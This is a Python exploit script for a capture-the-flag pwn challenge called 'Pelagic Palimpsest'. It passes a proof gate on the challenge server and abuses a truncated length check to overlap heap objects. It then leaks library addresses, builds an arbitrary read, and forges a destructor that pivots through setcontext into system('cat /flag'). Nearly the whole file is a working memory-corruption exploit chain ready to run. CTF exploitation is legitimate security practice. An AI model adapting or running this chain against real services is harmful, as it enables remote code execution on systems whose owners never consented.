#!/usr/bin/env python3
"""Exploit Pelagic Palimpsest and print the remote flag."""

import argparse
import hashlib
import os
import socket
import ssl
import struct
from pathlib import Path


HOST = os.environ.get("HOST", "palimpsest-305ae3c11451.chals.z0d1ak.org")
PORT = int(os.environ.get("PORT", "1337"))

HERE = Path(__file__).resolve().parent
HANDOUT = HERE / "challenge" / "handout"
CLEAN_ELF = HANDOUT / "clean-stage2.so"
ROOT_FILE = HANDOUT / "divergence.root"
LIBC_FILE = HANDOUT / "libc.so.6"

PAGE_SIZE = 0x1000
IMPLANT_TYPE = 0x4200
IMPLANT_MEMCPY_GOT = 0x3F70
LIBC_MEMCPY = 0x198AC0
LIBC_SETCONTEXT = 0x4A960
LIBC_SYSTEM = 0x58750


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def u32(data: bytes) -> int:
    return struct.unpack("<I", data)[0]


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data)[0]


def clean_pages() -> list[bytes]:
    elf = CLEAN_ELF.read_bytes()
    phoff = u64(elf[0x20:0x28])
    phentsize, phnum = struct.unpack("<HH", elf[0x36:0x3A])
    pages: list[bytes] = []

    for index in range(phnum):
        pos = phoff + index * phentsize
        p_type, p_flags, p_offset, _, _, p_filesz, _, _ = struct.unpack(
            "<IIQQQQQQ", elf[pos : pos + 56]
        )
        if p_type != 1 or p_flags & 2:
            continue
        segment = elf[p_offset : p_offset + p_filesz]
        for page_start in range(0, len(segment), PAGE_SIZE):
            page = segment[page_start : page_start + PAGE_SIZE]
            pages.append(page.ljust(PAGE_SIZE, b"\0"))

    if len(pages) != 214:
        raise RuntimeError(f"unexpected clean page count: {len(pages)}")
    return pages


class Tube:
    def __init__(self, host: str, port: int):
        raw = socket.create_connection((host, port), timeout=10)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self.sock = context.wrap_socket(raw, server_hostname=host)
        self.sock.settimeout(10)

    def recv_exact(self, size: int) -> bytes:
        result = bytearray()
        while len(result) < size:
            chunk = self.sock.recv(size - len(result))
            if not chunk:
                raise EOFError(f"connection closed after {len(result)}/{size} bytes")
            result.extend(chunk)
        return bytes(result)

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def frame(self) -> tuple[int, bytes]:
        status, size = struct.unpack("<BI", self.recv_exact(5))
        return status, self.recv_exact(size)

    def request(self, packet: bytes) -> bytes:
        self.send(packet)
        status, body = self.frame()
        if status != 0:
            raise RuntimeError(f"request failed ({status:#x}): {body!r}")
        return body


def pass_proof(tube: Tube) -> None:
    if tube.recv_exact(4) != b"DIVE":
        raise RuntimeError("bad proof-gate greeting")
    nonce = tube.recv_exact(32)
    count = tube.recv_exact(1)[0]
    indexes = [struct.unpack("<H", tube.recv_exact(2))[0] for _ in range(count)]

    root = bytes.fromhex(ROOT_FILE.read_text().strip())
    pages = clean_pages()
    proof = hashlib.blake2s(b"palimpsest-dive-proof-v2\0" + nonce + root).digest()
    for index in indexes:
        proof += hashlib.blake2s(
            b"palimpsest-page-possession-v2\0"
            + nonce
            + struct.pack("<H", index)
            + pages[index]
        ).digest()
    tube.send(proof)
    status, body = tube.frame()
    if status != 0:
        raise RuntimeError(f"proof rejected: {body!r}")
    print(f"[+] proof accepted ({indexes=})")


def op_new(tube: Tube, slot: int, length: int) -> None:
    tube.request(struct.pack("<BBI", 1, slot, length))


def op_write(tube: Tube, slot: int, offset: int, data: bytes) -> None:
    tube.request(struct.pack("<BBII", 2, slot, offset, len(data)) + data)


def op_show(tube: Tube, slot: int) -> bytes:
    return tube.request(struct.pack("<BB", 3, slot))


def guarded_overflow(tube: Tube, canary: int, desired: bytes) -> None:
    # Writing at note offset 0xd0 starts exactly at the next 0x100-byte object.
    offset = 0xD0
    minimum_end = 0x100 + len(desired)
    for end in range(minimum_end, offset + 0x3000 + 1):
        if ((end ^ canary) & 0xFFF) <= 0xD0:
            payload = desired.ljust(end - offset, b"\0")
            op_write(tube, 1, offset, payload)
            return
    raise RuntimeError("could not satisfy corrupted write guard")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?", default=HOST, help="TLS challenge hostname")
    parser.add_argument("port", nargs="?", type=int, default=PORT)
    args = parser.parse_args()
    host = args.host
    port = args.port
    tube = Tube(host, port)
    pass_proof(tube)

    # A 0x1d0 length passes because the constructor compares only its low byte.
    op_new(tube, 0, 0x1D0)
    op_new(tube, 1, 0x1D0)
    op_new(tube, 2, 0xD0)

    overlap = op_show(tube, 0)
    next_header = overlap[0xD0 : 0x100]
    refcount, sounding_type, _, object1, _, canary1 = struct.unpack(
        "<QQQQQI", next_header[:44]
    )
    if refcount != 1 or object1 & 0xFF:
        raise RuntimeError("unexpected neighboring object layout")

    implant = sounding_type - IMPLANT_TYPE
    object2 = object1 + 0x100
    arena = object1 - 0x100
    print(f"[+] arena       = {arena:#x}")
    print(f"[+] implant     = {implant:#x}")
    print(f"[+] write guard = {canary1:#x}")

    def arbitrary_read(address: int, size: int) -> bytes:
        forged = b"".join(
            (
                p64(1),
                p64(sounding_type),
                p64(size),
                p64(object2),
                p64(address),
                p32(0),
                p32(0),
            )
        )
        guarded_overflow(tube, canary1, forged)
        return op_show(tube, 2)

    memcpy = u64(arbitrary_read(implant + IMPLANT_MEMCPY_GOT, 8))
    libc = memcpy - LIBC_MEMCPY
    print(f"[+] memcpy      = {memcpy:#x}")
    print(f"[+] libc anchor = {libc:#x}")

    # The deployment's in-memory image is shifted relative to ordinary ELF
    # load bias. Resolve code by matching stable function prologues nearby.
    libc_image = LIBC_FILE.read_bytes()
    code_windows: dict[int, bytes] = {}

    def resolve_code(file_offset: int) -> int:
        nominal = libc + file_offset
        needle = libc_image[file_offset : file_offset + 32]

        # Search the early executable mapping. The leaked anchor is close to
        # the image, but the stale runtime does not preserve a normal bias.
        matches: list[int] = []
        scan_base = (libc & ~0xFFF) + 0x25000
        for window_start in range(scan_base, (libc & ~0xFFF) + 0x80000, 0x3000):
            window = code_windows.get(window_start)
            if window is None:
                window = arbitrary_read(window_start, 0x3000)
                code_windows[window_start] = window
            matches.extend(
                window_start + index
                for index in range(len(window))
                if window.startswith(needle, index)
            )
        if len(matches) != 1:
            raise RuntimeError(
                f"could not uniquely resolve libc code at {file_offset:#x}: {matches}"
            )
        return matches[0]

    setcontext = resolve_code(LIBC_SETCONTEXT)
    system = resolve_code(LIBC_SYSTEM)
    print(f"[+] setcontext  = {setcontext:#x}")
    print(f"[+] system      = {system:#x}")

    # Object 2 doubles as a ucontext. Its fake type lives farther into the arena.
    context = bytearray(0x338)
    fake_type = object2 + 0x300
    command = object2 + 0x200
    context[0x00:0x08] = p64(1)
    context[0x08:0x10] = p64(fake_type)
    context[0x68:0x70] = p64(command)           # restored rdi
    context[0xA0:0xA8] = p64(arena + 0x3008)   # restored rsp (SysV alignment)
    context[0xA8:0xB0] = p64(system)
    context[0xE0:0xE8] = p64(object2 + 0x180)  # fpregs state
    context[0x200:0x20A] = b"cat /flag\0"
    context[0x330:0x338] = p64(setcontext)  # fake tp_dealloc
    guarded_overflow(tube, canary1, bytes(context))
    print("[+] forged destructor; dropping victim")

    # The process normally dies after system() returns, so consume raw output.
    tube.send(struct.pack("<BB", 4, 2))
    tube.sock.settimeout(5)
    output = bytearray()
    try:
        while True:
            chunk = tube.sock.recv(4096)
            if not chunk:
                break
            output.extend(chunk)
    except (socket.timeout, ssl.SSLError):
        pass
    print(output.decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
